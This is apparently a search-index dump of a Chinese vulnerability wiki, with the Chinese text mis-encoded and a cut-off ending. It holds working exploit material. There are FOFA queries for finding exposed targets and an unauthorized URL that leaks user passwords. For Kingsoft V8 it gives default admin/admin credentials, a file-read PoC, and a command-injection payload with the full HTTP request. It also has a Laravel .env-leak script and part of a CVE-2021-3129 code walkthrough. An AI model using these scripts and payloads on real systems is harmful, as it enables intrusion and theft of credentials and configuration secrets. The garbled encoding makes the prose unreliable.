Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û.html","title":"ÈòøÂ∞îÊ≥ïÁßëÊäÄ ËôöÊãü‰ªøÁúüÂÆûÈ™åÂÆ§ Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û","keywords":"","body":"ÈòøÂ∞îÊ≥ïÁßëÊäÄ ËôöÊãü‰ªøÁúüÂÆûÈ™åÂÆ§ Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈòøÂ∞îÊ≥ïÁßëÊäÄ ËôöÊãü‰ªøÁúüÂÆûÈ™åÂÆ§ Â≠òÂú®Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥ûÔºåÈÄöËøáËÆøÈóÆÊûÑÈÄ†ÁöÑUrlÂèØ‰ª•Ëé∑ÂèñÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ËôöÊãü‰ªøÁúüÂÆûÈ™åÂÆ§ FOFA [!NOTE] body=\"Ê≤≥ÂçóÈòøÂ∞îÊ≥ïÁßëÊäÄÊúâÈôêÂÖ¨Âè∏\" ÊºèÊ¥ûÂ§çÁé∞ Êú™ÊéàÊùÉÁöÑUrl‰∏∫ /admin/student/studentlist.html?page=1 ÊàêÂäüËé∑ÂèñÊâÄÊúâÁî®Êà∑ÁöÑË¥¶Âè∑ÂØÜÁ†Å‰ø°ÊÅØ ÂèÇËÄÉÊñáÁ´† http://www.0dayhack.net/index.php/1702/ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÈáëÂ±±/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÈáëÂ±±/","title":"ÈáëÂ±±","keywords":"","body":"ÈáëÂ±± ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü ÈªòËÆ§Âº±Âè£‰ª§ÊºèÊ¥û ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü pdf_maker.php ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÈáëÂ±±/ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü ÈªòËÆ§Âº±Âè£‰ª§ÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÈáëÂ±±/ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü ÈªòËÆ§Âº±Âè£‰ª§ÊºèÊ¥û.html","title":"ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü ÈªòËÆ§Âº±Âè£‰ª§ÊºèÊ¥û","keywords":"","body":"ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü ÈªòËÆ§Âº±Âè£‰ª§ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü Â≠òÂú®ÈªòËÆ§Âº±Âè£‰ª§ÔºåÊîªÂáªËÄÖÂèØ‰ª•Ëé∑ÂæóÂÖ®ÈÉ®‰∏ªÊú∫ÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü FOFA [!NOTE] app=\"ÁåéÈπ∞ÂÆâÂÖ®-ÈáëÂ±±V8+ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÈôÜÈ°µÈù¢Â¶Ç‰∏ã ÈªòËÆ§Âè£‰ª§‰∏∫ admin/admin ÁôªÂΩïÂêéËé∑ÂèñÂÖ®ÈÉ®ÁöÑ‰∏ªÊú∫ÊùÉÈôê(ÂåÖÊã¨ËøõÁ®ãÊü•ÁúãÔºåÂëΩ‰ª§ÊâßË°åÁ≠â) Goby & POC [!NOTE] Kingsoft V8 Default weak password Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÈáëÂ±±/ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÈáëÂ±±/ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html","title":"ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û","keywords":"","body":"ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøáÊºèÊ¥û‰∏ãËΩΩÊúçÂä°Âô®‰ªªÊÑèÊñá‰ª∂ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü FOFA [!NOTE] title=\"Âú®Á∫øÂÆâË£Ö-V8+ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªüWebÊéßÂà∂Âè∞\" ÊºèÊ¥ûÂ§çÁé∞ Â≠òÂú®ÊºèÊ¥ûÁöÑÊñá‰ª∂ /Console/htmltopdf/downfile.php Êñá‰ª∂‰∏≠Ê≤°Êúâ‰ªª‰ΩïÁöÑËøáÊª§ ÈÄöËøáfilenameÂèÇÊï∞Âç≥ÂèØ‰∏ãËΩΩ‰ªªÊÑèÊñá‰ª∂ POC‰∏∫ http://xxx.xxx.xxx.xxx/htmltopdf/downfile.php?filename=downfile.php ÊºèÊ¥ûPOC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mTitle : ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/htmltopdf/downfile.php?filename=downfile.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"$filename\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {} Â≠òÂú®ÊºèÊ¥û , ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(target_url, response.text)) else: print(\"\\033[31m[x] ‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Kingsoft V8 Arbitrary file read Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÈáëÂ±±/ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü pdf_maker.php ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÈáëÂ±±/ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü pdf_maker.php ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü pdf_maker.php ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü pdf_maker.php ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü pdf_maker.php Â≠òÂú®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÁî±‰∫éÊ≤°ÊúâËøáÊª§Âç±Èô©Â≠óÁ¨¶ÔºåÂØºËá¥ÊûÑÈÄ†ÁâπÊÆäÂ≠óÁ¨¶Âç≥ÂèØËøõË°åÂëΩ‰ª§ÊãºÊé•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü FOFA [!NOTE] app=\"ÁåéÈπ∞ÂÆâÂÖ®-ÈáëÂ±±V8+ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ Â≠òÂú®ÊºèÊ¥ûÁöÑÊñá‰ª∂‰∏∫ Kingsoft\\Security Manager\\SystemCenter\\Console\\inter\\pdf_maker.php array(\"set_exportpdf_cmd\"=>array( \"url\"=>\"http://172.18.254.146/report/system/main.php?userSession=5784727B-7AEA-4EFE-B0CB-DDD6DA1CABD3&guid=1AC380D9-580C-49A8-B6EC-787CF50FA928&VHierarchyID=ADMIN\", \"fileName\"=>\"test1234.pdf\" ) )); */ $url = $_POST[\"url\"]; $fileName = $_POST[\"fileName\"]; $batName=$fileName; if ($url == null || $fileName == null) { $return[\"nResult\"] = __LINE__; echo json_encode($return,JSON_UNESCAPED_UNICODE); return ; } $url = base64_decode($url); $nameStr = base64_decode($fileName).date(\"Y-m-d\").\".pdf\"; $fileName=\"..\\\\htmltopdf\\\\\".$nameStr; system('mkdir ..\\\\htmltopdf'); $cmd = '..\\\\..\\\\wkhtmltopdf.exe \"'.$url.'\" '.$fileName; if (getApacheVersion()>=24) { //apache 2.4 php 7 ÁâàÊú¨ Âè™ËÉΩÂú® bat‰∏≠ËøêË°å $cmd =\" del \".$fileName; exec($cmd); $url_= str_replace('%','%%', $url); $cmd = '..\\\\..\\\\wkhtmltopdf.exe \"'.$url_.'\" '.$fileName; $batName =\"exec_wkhtmltopdf.bat\"; $myfile = fopen($batName , \"w\"); //$cmd =iconv(\"UTF-8\", \"gbk\", $cmd ); fwrite($myfile, $cmd); fclose($myfile); $cmd =$batName ; exec($cmd); $cmd =\" del \".$batName; exec($cmd); }else { system($cmd); } // echo $url; $return = array(\"nResult\" => \"0\",\"fileName\" =>$nameStr,\"url\"=>$url); echo json_encode($return,JSON_UNESCAPED_UNICODE); ?> ËøôÈáå‰º†ÂÖ• base64Âä†ÂØÜÁöÑÊãºÊé•ÂëΩ‰ª§Âç≥ÂèØÊâßË°å‰ªªÊÑèÂëΩ‰ª§ \"|| ipconfig || --base64--> url=IiB8fCBpcGNvbmZpZyB8fA==&fileName=xxx POST /inter/pdf_maker.php HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 45 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=noei1ghcv9rqgp58jf79991n04 url=IiB8fCBpcGNvbmZpZyB8fA%3D%3D&fileName=xxx ÊºèÊ¥ûPOC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mTitle : ÈáëÂ±± V8 ÁªàÁ´ØÂÆâÂÖ®Á≥ªÁªü pdf_maker.php ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/inter/pdf_maker.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"url=IiB8fCBpcGNvbmZpZyB8fA==&fileName=xxx\" try: response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"Windows\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {} Â≠òÂú®ÊºèÊ¥û ,ÊâßË°å ipconfig, ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(target_url, response.text)) else: print(\"\\033[31m[x] ‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Kingsoft V8 pdf_maker.php RCE Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÂºÄÂèëÊ°ÜÊû∂ÊºèÊ¥û/":{"url":"book/ÂºÄÂèëÊ°ÜÊû∂ÊºèÊ¥û/","title":"ÂºÄÂèëÊ°ÜÊû∂ÊºèÊ¥û","keywords":"","body":"ÂºÄÂèëÊ°ÜÊû∂ÊºèÊ¥ûüêá Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÂºÄÂèëÊ°ÜÊû∂ÊºèÊ¥û/Laravel/":{"url":"book/ÂºÄÂèëÊ°ÜÊû∂ÊºèÊ¥û/Laravel/","title":"Laravel","keywords":"","body":"Laravel Laravel .env ÈÖçÁΩÆÊñá‰ª∂Ê≥ÑÈú≤ CVE-2017-16894 Laravel Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÂºÄÂèëÊ°ÜÊû∂ÊºèÊ¥û/Laravel/Laravel .env ÈÖçÁΩÆÊñá‰ª∂Ê≥ÑÈú≤ CVE-2017-16894.html":{"url":"book/ÂºÄÂèëÊ°ÜÊû∂ÊºèÊ¥û/Laravel/Laravel .env ÈÖçÁΩÆÊñá‰ª∂Ê≥ÑÈú≤ CVE-2017-16894.html","title":"Laravel .env ÈÖçÁΩÆÊñá‰ª∂Ê≥ÑÈú≤ CVE-2017-16894","keywords":"","body":"Laravel .env ÈÖçÁΩÆÊñá‰ª∂Ê≥ÑÈú≤ CVE-2017-16894 ÊºèÊ¥ûÊèèËø∞ Laravel FrameworkÊòØTaylor OtwellËΩØ‰ª∂ÂºÄÂèëËÄÖÂºÄÂèëÁöÑ‰∏ÄÊ¨æÂü∫‰∫éPHPÁöÑWebÂ∫îÁî®Á®ãÂ∫èÂºÄÂèëÊ°ÜÊû∂„ÄÇ Laravel framework 5.5.21Âèä‰πãÂâçÁöÑÁâàÊú¨‰∏≠Â≠òÂú® .env Êñá‰ª∂ÂèØË¢´‰∏ãËΩΩÁöÑ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û„ÄÇËøúÁ®ãÊîªÂáªËÄÖÂèØÂà©Áî®ËØ•ÊºèÊ¥ûËé∑ÂèñÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Laravel framework FOFA [!NOTE] app=\"Laravel-Framework\" ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆÁõÆÊ†á url http://xxx.xxx.xxx.xxx/.env ÂΩìÈÖçÁΩÆ‰∏çÂΩì‰∏îÂú®ÂΩ±ÂìçËåÉÂõ¥ÂÜÖÊó∂‰ºöÂá∫Áé∞ .envÂèØË¢´‰∏ãËΩΩÁöÑÊÉÖÂÜµÔºåÂØºËá¥Êï∞ÊçÆÂ∫ìË¥¶Âè∑ÂØÜÁ†ÅÁ≠âÊïèÊÑü‰ø°ÊÅØÁöÑÊ≥ÑÈú≤ ËøôÈáå‰ΩøÁî®POCËÑöÊú¨Êù•ËøõË°å‰ø°ÊÅØËé∑Âèñ ÊºèÊ¥ûÂà©Áî®POC import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Laravel framework >> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/.env\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"APP_NAME\" in response.text: print(\"\\033[32m[o] ÁõÆÊ†á{}Â≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] .env Êñá‰ª∂ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ Laravel.env_configuration_file_leaks(CVE-2017-16894).json Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÂºÄÂèëÊ°ÜÊû∂ÊºèÊ¥û/Laravel/Laravel Â∞è‰∫é 8.4.2 DebugÊ®°Âºè _ignition ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2021-3129.html":{"url":"book/ÂºÄÂèëÊ°ÜÊû∂ÊºèÊ¥û/Laravel/Laravel Â∞è‰∫é 8.4.2 DebugÊ®°Âºè _ignition ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2021-3129.html","title":"Laravel Â∞è‰∫é 8.4.2 DebugÊ®°Âºè _ignition ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2021-3129","keywords":"","body":"Laravel ÊºèÊ¥ûÊèèËø∞ Laravel ÊòØ‰∏Ä‰∏™ÂÖçË¥πÁöÑÂºÄÊ∫ê PHP Web Ê°ÜÊû∂ÔºåÊó®Âú®ÂÆûÁé∞ÁöÑWebËΩØ‰ª∂ÁöÑMVCÊû∂ÊûÑ„ÄÇ2021Âπ¥1Êúà13Êó•ÔºåÈòøÈáå‰∫ëÂ∫îÊÄ•ÂìçÂ∫î‰∏≠ÂøÉÁõëÊéßÂà∞ÂõΩÂ§ñÊüêÂÆâÂÖ®Á†îÁ©∂Âõ¢ÈòüÊä´Èú≤‰∫Ü Laravel ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Laravel Ê°ÜÊû∂ facade ignition ÁªÑ‰ª∂ ÁéØÂ¢ÉÊê≠Âª∫ https://github.com/SNCKER/CVE-2021-3129.git docker-compose up -d ÁÇπÂáªÁîüÊàêÂØÜÈí•Âá∫Áé∞Â¶Ç‰∏ãÂõæÂç≥ÊàêÂäüÂàõÂª∫ÊºèÊ¥ûÁéØÂ¢É ÊºèÊ¥ûÂ§çÁé∞ ÊåâÁÖßÊºèÊ¥ûÂÖ¨ÂºÄÊñáÁ´†ÈúÄË¶ÅÂÖàÊúâ‰∏Ä‰∏™Êú™Áü•ÂèòÈáèÁöÑÈîôËØØÔºåÊù•ÁÇπÂáª Make variable optional [!NOTE] ÊåâÁÖßÂÆòÊñπÊâãÂÜåÂàõÂª∫Ë∑ØÁî±ÂíåViewÊ®°Êùø ÈÄöËøáÁÇπÂáª‚ÄúMake variableOptional‚ÄùÊåâÈíÆÔºåÊ®°ÊùøÂèòÈáèÂàô‰ºöË¢´‰øÆÊîπ„ÄÇÂ¶ÇÊûúÊ£ÄÊü•HTTPÊó•ÂøóÔºåÊàë‰ª¨Â∞±‰ºöÁúãÂà∞Ë¢´Ë∞ÉÁî®ÁöÑÁ´ØÁÇπ ÈÄöËøáËøô‰∫õsolutionsÔºåÂºÄÂèëËÄÖÂèØ‰ª•ÈÄöËøáÁÇπÂáªÊåâÈíÆÁöÑÊñπÂºèÔºåÂø´ÈÄü‰øÆÂ§ç‰∏Ä‰∫õÈîôËØØ„ÄÇÊú¨Ê¨°ÊºèÊ¥ûÂ∞±ÊòØÂÖ∂‰∏≠ÁöÑvendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.phpËøáÊª§‰∏ç‰∏•Ë∞®ÂØºËá¥ÁöÑ„ÄÇÈ¶ñÂÖàÊàë‰ª¨Âà∞ÊâßË°åsolutionÁöÑÊéßÂà∂Âô®ÂΩì‰∏≠ÂéªÔºåÁúãÁúãÊòØÂ¶Ç‰ΩïË∞ÉÁî®Âà∞solutionÁöÑ getRunnableSolution(); $solution->run($request->get('parameters', [])); return response(''); } } Êé•ÁùÄË∞ÉÁî®solutionÂØπË±°‰∏≠ÁöÑrun()ÊñπÊ≥ïÔºåÂπ∂Â∞ÜÂèØÊéßÁöÑparametersÂèÇÊï∞‰º†ËøáÂéª„ÄÇÈÄöËøáËøô‰∏™ÁÇπÊàë‰ª¨ÂèØ‰ª•Ë∞ÉÁî®Âà∞MakeViewVariableOptionalSolution::run() makeOptional($parameters); if ($output !== false) { file_put_contents($parameters['viewFile'], $output); } } public function makeOptional(array $parameters = []) { $originalContents = file_get_contents($parameters['viewFile']); $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName'].\" ?? ''\", $originalContents); $originalTokens = token_get_all(Blade::compileString($originalContents)); $newTokens = token_get_all(Blade::compileString($newContents)); $expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']); if ($expectedTokens !== $newTokens) { return false; } return $newContents; } protected function generateExpectedTokens(array $originalTokens, string $variableName): array { $expectedTokens = []; foreach ($originalTokens as $token) { $expectedTokens[] = $token; if ($token[0] === T_VARIABLE && $token[1] === '$'.$variableName) { $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_COALESCE, '??', $token[2]]; $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, \"''\", $token[2]]; } } return $expectedTokens; } } ÂèØ‰ª•ÁúãÂà∞ËøôÈáå‰∏ªË¶ÅÂäüËÉΩÁÇπÊòØÔºöËØªÂèñ‰∏Ä‰∏™ÁªôÂÆöÁöÑË∑ØÂæÑÔºåÂπ∂ÊõøÊç¢$variableName‰∏∫$variableName ?? ''Ôºå‰πãÂêéÂÜôÂõûÊñá‰ª∂‰∏≠„ÄÇÁî±‰∫éËøôÈáåË∞ÉÁî®‰∫Üfile_get_contents()Ôºå‰∏îÂÖ∂‰∏≠ÁöÑÂèÇÊï∞ÂèØÊéßÔºåÊâÄ‰ª•ËøôÈáåÂèØ‰ª•ÈÄöËøáphar://ÂçèËÆÆÂéªËß¶ÂèëpharÂèçÂ∫èÂàóÂåñ„ÄÇÂ¶ÇÊûúÂêéÊúüÂà©Áî®Ê°ÜÊû∂ËøõË°åÂºÄÂèëÁöÑ‰∫∫ÂëòÔºåÂÜôÂá∫‰∫Ü‰∏Ä‰∏™Êñá‰ª∂‰∏ä‰º†ÁöÑÂäüËÉΩ„ÄÇÈÇ£‰πàÊàë‰ª¨Â∞±ÂèØ‰ª•‰∏ä‰º†‰∏Ä‰∏™ÊÅ∂ÊÑèpharÊñá‰ª∂ÔºåÂà©Áî®‰∏äËø∞ÁöÑfile_get_contents()ÂéªËß¶ÂèëpharÂèçÂ∫èÂàóÂåñÔºåËææÂà∞rceÁöÑÊïàÊûú„ÄÇ Èô§‰∫ÜËß£ÂÜ≥ÊñπÊ°àÁöÑÁ±ªÂêç‰πãÂ§ñÔºåËøòÂèëÈÄÅ‰∫Ü‰∏Ä‰∏™Êñá‰ª∂Ë∑ØÂæÑÂíå‰∏Ä‰∏™Êàë‰ª¨Ë¶ÅÊõøÊç¢ÁöÑÂèòÈáèÂêç„ÄÇËøôÁúãËµ∑Êù•ÈùûÂ∏∏ËÆ©‰∫∫ÊÑüÂÖ¥Ë∂£„ÄÇ ËÆ©Êàë‰ª¨ÂÖàÊ£ÄÊü•‰∏Ä‰∏ãÁ±ªÂêçÁöÑÂà©Áî®ÊñπÊ≥ïÔºöÊàë‰ª¨ÂèØ‰ª•ÂÆû‰æãÂåñ‰ªªÊÑèÁöÑÁ±ªÂêóÔºü class SolutionProviderRepository implements SolutionProviderRepositoryContract { ... public function getSolutionForClass(string $solutionClass): ?Solution { if (! class_exists($solutionClass)) { return null; } if (! in_array(Solution::class, class_implements($solutionClass))) { return null; } return app($solutionClass); } } Á≠îÊ°àÊòØÂê¶ÂÆöÁöÑÔºöIgnitionÊÄªÊòØÁî®Êàë‰ª¨ÊåáÂêëÁöÑÁ±ªÊù•ÂÆûÁé∞RunnableSolution ÈÇ£‰πàÔºåËÆ©Êàë‰ª¨‰ªîÁªÜÁúãÁúãËøô‰∏™Á±ª„ÄÇÂÆûÈôÖ‰∏äÔºåË¥üË¥£ËØ•Êìç‰ΩúÁöÑ‰ª£Á†Å‰Ωç./vendor/facade/ignition/sr/solutions/MakeViewVariableOptionalSolution.phpÊñá‰ª∂‰∏≠„ÄÇÈÇ£‰πàÔºåÊàë‰ª¨ÂèØ‰ª•Êõ¥Êîπ‰ªªÊÑèÊñá‰ª∂ÁöÑÂÜÖÂÆπ‰πàÔºü class MakeViewVariableOptionalSolution implements RunnableSolution { ... public function run(array $parameters = []) { $output = $this->makeOptional($parameters); if ($output !== false) { file_put_contents($parameters['viewFile'], $output); } } public function makeOptional(array $parameters = []) { $originalContents = file_get_contents($parameters['viewFile']); // [1] $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName'].\" ?? ''\", $originalContents); $originalTokens = token_get_all(Blade::compileString($originalContents)); // [2] $newTokens = token_get_all(Blade::compileString($newContents)); $expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']); if ($expectedTokens !== $newTokens) { // [3] return false; } return $newContents; } protected function generateExpectedTokens(array $originalTokens, string $variableName): array { $expectedTokens = []; foreach ($originalTokens as $token) { $expectedTokens[] = $token; if ($token[0] === T_VARIABLE && $token[1] === '$'.$variableName) { $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_COALESCE, '??', $token[2]]; $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = 